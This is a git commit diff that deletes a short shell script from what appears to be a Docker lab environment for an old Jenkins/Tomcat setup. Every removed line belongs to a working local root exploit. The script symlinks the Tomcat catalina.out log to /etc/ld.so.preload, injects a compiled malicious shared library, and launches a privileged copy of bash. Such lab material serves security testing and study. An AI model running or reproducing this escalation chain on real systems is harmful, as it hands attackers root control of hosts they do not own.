829cd4ec0bd562ab2a05e76dadc4013732371a7a
Alessandro Pezzè <igougi.ui@gmail.com>
2016-11-28 15:30:57 +0100

    removed jenkins java7

--- Docker/Jenkins1.531Java7/shared/test.sh
+++
@@ -1,9 +0,0 @@
-cp /bin/bash /tmp/tomcat7/rootsh
-gcc -Wall -fPIC -shared -o ./own.so ./shared/own.c -ldl
-rm /var/log/tomcat7/catalina.out
-ln -s /etc/ld.so.preload /var/log/tomcat7/catalina.out
-ps -aux
-kill 38
-echo /tmp/tomcat7/own.so > /etc/ld.so.preload
-sudo --help
-./rootsh -p
